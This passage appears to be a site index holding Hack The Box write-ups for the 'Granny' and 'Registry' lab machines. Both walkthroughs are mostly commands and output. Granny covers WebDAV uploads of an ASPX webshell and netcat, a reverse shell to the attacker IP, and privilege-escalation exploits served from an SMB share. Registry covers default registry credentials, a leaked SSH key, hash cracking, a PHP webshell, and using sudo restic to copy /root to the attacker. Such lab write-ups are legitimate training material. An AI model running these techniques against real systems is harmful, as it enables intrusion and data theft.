GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK\n    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n\n2. We instantly see that it's IIS 6.0 and webdab seems to be open. Run davtest to find out more.\n\n  [root:/git/htb/granny]# davtest -url http://10.10.10.15                                                                           (master✱)\n    ********************************************************\n     Testing DAV connection\n    OPEN        SUCCEED:        http://10.10.10.15\n    ********************************************************\n    NOTE    Random string for this session: YDySC7gsiCC\n    ********************************************************\n     Creating directory\n    MKCOL       SUCCEED:        Created http://10.10.10.15/DavTestDir_YDySC7gsiCC\n    ********************************************************\n     Sending test files\n    PUT php SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.php\n    PUT cgi FAIL\n    PUT asp FAIL\n    PUT txt SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt\n    PUT shtml   FAIL\n    PUT pl  SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.pl\n    PUT aspx    FAIL\n    PUT jsp SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jsp\n    PUT html    SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html\n    PUT jhtml   SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jhtml\n    PUT cfm SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.cfm\n    ********************************************************\n     Checking for test file execution\n    EXEC    php FAIL\n    EXEC    txt SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt\n    EXEC    pl  FAIL\n    EXEC    jsp FAIL\n    EXEC    html    SUCCEED:    http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html\n    EXEC    jhtml   FAIL\n    EXEC    cfm FAIL\n\n    ********************************************************\n    /usr/bin/davtest Summary:\n    Created: http://10.10.10.15/DavTestDir_YDySC7gsiCC\n    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.php\n    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt\n    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.pl\n    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jsp\n    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html\n    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jhtml\n    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.cfm\n    Executes: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt\n    Executes: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html\n\n  Unfortunatley we are unable to upload aspx, otherwise this would be an easy webshell. However, method 'MOVE' is allowed,\n  meaning we can move already uploaded files and change their filename (and ending).\n\n    [root:/git/htb/granny]# mv shell.aspx shell.txt                                                                                   (master✱)\n    [root:/git/htb/granny]# curl http://10.10.10.15/ --upload-file shell.txt                                                          (master✱)\n    [root:/git/htb/granny]# curl -X MOVE --header \"Destination:http://10.10.10.15/shell.aspx\" http://10.10.10.15/shell.txt\n\n  Browse for RCE: http://10.10.10.15/shell.aspx\n\n  OR USING CADAVER:\n    cadaver http://granny.htb\n    mput fil.txt\n    mv fil.txt fil.aspx\n\n\n2. Executing nc64.exe for a reverse shell directly through my smb share doesn't work, so upload nc64.exe the same way.\n\n    [root:/git/htb/granny]# cp /opt/nc64.exe nc64.txt\n    [root:/git/htb/granny]# curl http://10.10.10.15/ --upload-file nc64.txt                                                           (master✱)\n    [root:/git/htb/granny]# curl -X MOVE --header \"Destination:http://10.10.10.15/nc64.exe\" http://10.10.10.15/nc64.txt\n\n  Enumerating the box we find that nc64.exe is uploaded to 'c:\\Inetpub\\wwwroot\\nc64.exe'\n  Trying to execute the binary gives nothing: c:\\Inetpub\\wwwroot\\nc64.exe 10.10.14.8 4488 -e cmd\n  Lets try nc.exe instead;\n    [root:/git/htb/granny]# mv nc.exe nc.txt                                                                                          (master✱)\n    [root:/git/htb/granny]# curl http://10.10.10.15/ --upload-file nc.txt                                                             (master✱)\n    [root:/git/htb/granny]# curl -X MOVE --header \"Destination:http://10.10.10.15/nc.exe\" http://10.10.10.15/nc.txt\n    Execute RCE: c:\\Inetpub\\wwwroot\\nc.exe 10.10.14.8 4488 -e powershell\n\n    [root:/git/htb/granny]# rlwrap nc -lvnp 4488                                                                                      (master✱)\n      listening on [any] 4488 ...\n      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.15] 1082\n    [root:/git/htb/granny]# rlwrap nc -lvnp 4488                                                                                      (master✱)\n      listening on [any] 4488 ...\n      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.15] 1083\n\n    We get a incomming connection, however the shell dies instantly. Lets try cmd instead of powershell.\n    Execute RCE: c:\\Inetpub\\wwwroot\\nc.exe 10.10.14.8 4488 -e cmd\n\n    [root:/git/htb/granny]# rlwrap nc -lvnp 4488                                                                                      (master✱)\n      listening on [any] 4488 ...\n      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.15] 1085\n      Microsoft Windows [Version 5.2.3790]\n      (C) Copyright 1985-2003 Microsoft Corp.\n\n      c:\\windows\\system32\\inetsrv&gt; whoami\n        nt authority\\network service\n\n\n3. Grab the 'systeminfo' and use windows-exploit-suggester.\n\n  [root:/git/htb/granny]# python /opt/windows-exploit-suggester.py --update                                                         (master✱)\n    [*] initiating winsploit version 3.3...\n    [+] writing to file 2021-03-02-mssb.xls\n    [*] done\n  [root:/git/htb/granny]# python /opt/windows-exploit-suggester.py --database 2021-03-02-mssb.xls --systeminfo systeminfo.txt\n    [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n    [+] windows version identified as 'Windows 2003 SP2 32-bit'\n    [*]\n    [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important\n    [*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC\n    [*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF\n    [*]\n    [E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical\n    [*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC\n    [*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC\n    [*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC\n    [*]\n    [E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important\n    [*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC\n    [*]\n    [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical\n    [*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC\n    [*]\n    [M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical\n    [*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC\n    [*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC\n    [*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC\n    [*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF\n    [*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF\n    [*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF\n    [*]\n    [M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important\n    [*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC\n    [*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation\n    [*]\n    [M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical\n    [*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF\n    [*]\n    [E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important\n    [*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC\n    [*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC\n    [*]\n    [E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical\n    [E] MS14-029: Security Update for Internet Explorer (2962482) - Critical\n    [*]   http://www.exploit-db.com/exploits/34458/\n    [*]\n    [E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important\n    [*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC\n    [*]\n    [M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical\n    [M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important\n    [E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important\n    [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important\n    [M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical\n    [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical\n    [M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical\n    [M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important\n    [M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical\n    [M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical\n    [M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical\n    [M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical\n    [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical\n    [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical\n    [*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC\n    [*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC\n    [*]\n    [M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important\n    [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important\n    [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important\n    [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical\n    [M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important\n    [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical\n    [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical\n    [M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical\n    [M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important\n    [M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important\n    [M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important\n    [M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical\n    [M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical\n    [M] MS08-078: Security Update for Internet Explorer (960714) - Critical\n    [*] done\n\n\n    MS14-070:\n      No output when executing binary\n\n    MS15-051:\n      Froze/crashed shell\n\n    MS14-068:\n      C:\\Inetpub\\wwwroot&gt; //10.10.14.8/share/MS14-068.exe\n        Traceback (most recent call last):\n        File \"&lt;string&gt;\", line 14, in &lt;module&gt;\n        File \"Z:\\usr\\share\\pyinstaller\\PyInstaller-3.1.1\\PyInstaller\\loader\\pyimod03_importers.py\", line 315, in load_module\n        File \"Z:\\usr\\share\\pyinstaller\\PyInstaller-3.1.1\\PyInstaller\\loader\\pyimod02_archive.py\", line 323, in extract\n        IOError: [Errno 9] Bad file descriptor\n        ms14-068 returned -1\n\n    MS15-010:\n      C:\\Inetpub\\wwwroot&gt; //10.10.14.8/share/39035.exe\n        The image file \\\\10.10.14.8\\share\\39035.exe is valid, but is for a machine type other than the current machine.\n\n    MS14-040:\n      C:\\Inetpub\\wwwroot&gt; //10.10.14.8/share/MS14-40-x86.exe\n        [+] creating socket...\n        [+] got sock 0x668\n        [+] sock connected.\n\n        [+] GO!\n        [+] Retrieving Kernel info...\n        [+] Kernel version: ntkrnlpa.exe\n        [+] Kernel base address: 0x80800000L\n        [+] HalDispatchTable address: 0x8088e078L\n        Traceback (most recent call last):\n        File \"&lt;string&gt;\", line 158, in &lt;module&gt;\n        TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'\n\n\n4. None of the exploits are giving anything of use. Googling about 'windows 2003 privilege escalation' and we find MS09-012,\n   Privelege Escalation via Token Kidnapping.\n\n   Setup a local SMB Server again and try the exploit:\n\n   [root:/srv/pub-share]# smbserver.py share .\n   [root:/srv/pub-share]# cp /opt/windows-kernel-exploits/MS09-012/pr.exe .\n\n   C:\\Documents and Settings&gt; //10.10.14.8/share/pr.exe \"whoami\"\n     /xxoo/--&gt;Build&&Change By p\n     /xxoo/--&gt;This exploit gives you a Local System shell\n     /xxoo/--&gt;Got WMI process Pid: 1756\n     begin to try\n     /xxoo/--&gt;Found token SYSTEM\n     /xxoo/--&gt;Command:whoami\n      nt authority\\system\n\n   It works, we are nt authority\\system! Grab user- and root.txt\n\n    C:\\Documents and Settings&gt; //10.10.14.8/share/pr.exe \"type Lakis\\Desktop\\user.txt\"\n      /xxoo/--&gt;Build&&Change By p\n      /xxoo/--&gt;This exploit gives you a Local System shell\n      /xxoo/--&gt;Got WMI process Pid: 1756\n      begin to try\n      /xxoo/--&gt;Found token SYSTEM\n      /xxoo/--&gt;Command:type Lakis\\Desktop\\user.txt\n        700c5dc163014e22b3e408f8703f67d1\n\n    C:\\Documents and Settings&gt; //10.10.14.8/share/pr.exe \"type Administrator\\Desktop\\root.txt\"\n      /xxoo/--&gt;Build&&Change By p\n      /xxoo/--&gt;This exploit gives you a Local System shell\n      /xxoo/--&gt;Got WMI process Pid: 3564\n      begin to try\n      /xxoo/--&gt;Found token SYSTEM\n      /xxoo/--&gt;Command:type Administrator\\Desktop\\root.txt\n        aa4beed1c0584445ab463a6747bd06e9\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nMS09-012: https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e https://www.exploit-db.com/exploits/6705"
  },
  {
    "objectID": "posts/2019-10-29-htb-writeup-registry/2019-10-29-htb-writeup-registry.html",
    "href": "posts/2019-10-29-htb-writeup-registry/2019-10-29-htb-writeup-registry.html",
    "title": "Registry - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n 10.10.10.159 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nAdd all names to /etc/hosts root@p3:~# cat /etc/hosts 10.10.10.159 registry.htb registry.htb.local docker.registry.htb\nEnumeration with dirb finds.. .. a login prompt at http://docker.registry.htb/v2/ .. a page with scrambled text at http://registry.htb/install/\n\n3.1 (OPTIONAL) The data on registry.htb/install/ is actually not garbage, but gzip compressed data. root@p3:/opt/htb# curl http://registry.htb/install/ -o test | tac | file -b test gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was ““, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1050 0 1050 0 0 15217 0 –:–:– –:–:– –:–:– 15000\n Decompress it using gunzip:\n  root@p3:/opt/htb/machines/registry# curl http://registry.htb/install/ -o - | gunzip\n    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                   Dload  Upload   Total   Spent    Left  Speed\n  100  1050    0  1050    0     0  15441      0 --:--:-- --:--:-- --:--:-- 15441\n  ca.crt0000775000004100000410000000210613464123607012215 0ustar  www-datawww-data\n  -----BEGIN CERTIFICATE-----\n  MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV\n  BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER\n  MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB\n  AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5\n  T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5\n  zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc\n  r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1\n  zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI\n  qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX\n  8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV\n  HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3\n  LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ\n  UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N\n  7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr\n  CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9\n  QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B\n  -----END CERTIFICATE-----\n  readme.md0000775000004100000410000000020113472260460012667 0ustar  www-datawww-data\n  # Private Docker Registry\n\n  - https://docs.docker.com/registry/deploying/\n  - https://docs.docker.com/engine/security/certificates/\n\n  gzip: stdin: unexpected end of file\n3.2 (OPTIONAL) Write the certificate - ca.crt - to a file and import it to firefox. Remove the old unsecure https cert to get a secure, trused, connection towards https://docker.registry.htb\n\nEnumeration with nikto finds.. .. Default account found for ‘Registry’ at /v2/_catalog (ID ‘admin’, PW ‘admin’). .. /v2/_catalog: This is the Docker Registry server. This might be interesting…\nUsing CURL we can browse and download files from the Registry. Note that this can also be done through the browser. Search for available repos: root@p3:/opt/htb# curl -u admin:admin -k –request GET https://docker.registry.htb/v2/_catalog {“repositories”:[“bolt-image”]}\nBrowse the repo ‘bolt-image’: root@p3:/opt/htb# curl -u admin:admin -k –request GET https://docker.registry.htb/v2/bolt-image/tags/list# {“name”:“bolt-image”,“tags”:[“latest”]}\nBrowse/download the tag ‘latest’, in example below I’ll download it: curl -u admin:admin -k –request GET https://docker.registry.htb/v2/bolt-image/manifests/latest -O % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 7439 100 7439 0 0 44544 0 –:–:– –:–:– –:–:– 44544\nView the output of the file latest and download all the blobs within. curl -u admin:admin -k -O –request GET .. .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7 .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0 .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797 .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff\nLoot: .. expect “Enter passphrase for /root/.ssh/id_rsa:” send “GkOcz221Ftb3ugog”; .. useradd -m bolt .. id_rsa and id_rsa.pub\nChange permissions of id_rsa and login with SSH using found credentials and key (bolt:GkOcz221Ftb3ugog) root@p3:/opt/htb/machines/registry# chmod 600 id_rsa root@p3:/opt/htb/machines/registry# ssh bolt@registry.htb -i id_rsa Enter passphrase for key ‘id_rsa’: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)\n System information as of Tue Oct 29 09:43:36 UTC 2019\n\n System load:  0.0               Users logged in:                0\n Usage of /:   5.5% of 61.80GB   IP address for eth0:            10.10.10.159\n Memory usage: 22%               IP address for br-1bad9bd75d17: 172.18.0.1\n Swap usage:   0%                IP address for docker0:         172.17.0.1\n Processes:    154\nLast login: Mon Oct 21 10:31:48 2019 from 10.10.14.2 bolt@bolt:~$ bolt@bolt:~$ cat user.txt ytc0****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerate with lse.sh and find the Bolt git repo /var/www/html/bolt/.git\nLook within the repo and find a .db for Bolt. Unable to download the file using http.server and wget so instead use scp locally. root@p3# scp -i id_rsa bolt@registry.htb:/var/www/html/bolt/app/database/bolt.db /opt/htb/machines/registry/ Enter passphrase for key ‘id_rsa’: bolt.db 100% 288KB 1.6MB/s 00:00\nOpen the .db with SQLite and under table bolt_users you find user ‘admin’ with a password hash.\nCrack the hash using hashcat -m3200 (Blowfish) root@p3:/opt/htb/machines/registry# hashcat -a0 -m3200 bolt-hash.txt /usr/share/wordlists/rockyou.txt -o hash-cracked.txt –force root@p3:/opt/htb/machines/registry# cat hash-cracked.txt $2y\\(10\\)e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry\nNOTE: Bolt creds - admin:strawberry\nLogin as Bolt admin on the login page (found by manually looking through /var/www/html) http://registry.htb/bolt/bolt\nChange the Main Configuration to allow .php Uploads Configuration &gt; Main Configuration &gt; Add ‘php’ in the end of ‘accept_file_types’\nUpload a php-webshell from the File Management, use it and QUICKLY move the shell back one dir. (files dir auto clears every 60s) mv webshell.php ..\nAccess the webshell again and continue enumeration as www-data http://registry.htb/bolt/webshell.php?cmd=id\nExecuting ‘sudo -l’ shows that we have root privs to do a restic backup to a remote REST server. User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest*\nInstall the prerequisites in order to do the backup to your local machine root@p3:/srv# apt install restic root@p3:/srv# apt install golang (required for rest server) root@p3:/srv# git clone https://github.com/restic/rest-server.git root@p3:/srv/rest-server# make install\nLocally - create (init) a new Restic repo and start the rest-server. All outgoing traffic from registry.htb is blocked, we can’t wget files, ssh, or push a backup to our local repo. To circumvent this we need to create a SSH-tunnel over port 8000 (rest-server default port). root@p3:/srv# restic init –repo /srv/restic-repo enter password for new repository: (mypass) enter password again: (mypass) created restic repository 817c1fd867 at /srv/restic-repo\nroot@p3:/srv# rest-server –path /srv/restic-repo/ –no-auth root@p3:/opt/htb/machines/registry# ssh -R 8000:127.0.0.1:8000 bolt@registry.htb -i id_rsa\nOn the remote host create a password-file for the restic-repo and backup the /root dir to your local restic repo echo “mypass” &gt; pp\nsudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root -p pp scan [/root] [0:00] 10 directories, 14 files, 28.066 KiB scanned 10 directories, 14 files in 0:00 [0:00] 100.00% 28.066 KiB / 28.066 KiB 24 / 24 items 0 errors ETA 0:00\nduration: 0:00\nsnapshot 404fffee saved\nView your snapshots and backup the root dir from Registry. Grab root.txt root@p3:/srv# restic -r /srv/restic-repo/ snapshots enter password for repository: repository 817c1fd8 opened successfully, password is correct ID Time Host Tags Paths ——————————————————————————— d6a158ec 2019-11-07 10:46:02 p3 /opt/htb/machines/registry 404fffee 2019-11-07 10:48:05 bolt /root ——————————————————————————— 2 snapshots\nroot@p3:/srv# restic -r /srv/restic-repo/ restore 404fffee –target /opt/htb/machines/registry/restic-restore enter password for repository: repository 817c1fd8 opened successfully, password is correct restoring &lt;Snapshot 404fffee of [/root] at 2019-11-07 09:48:05.721258436 +0000 UTC by root@bolt&gt; to /opt/htb/machines/registry/restic-restore\nroot@p3:/srv# tree /opt/htb/machines/registry/restic-restore/ /opt/htb/machines/registry/restic-restore/ └── root ├── config.yml ├── cron.sh └── root.txt\n1 directory, 3 files\nroot@p3:/srv# cat /opt/htb/machines/registry/restic-restore/root/root.txt 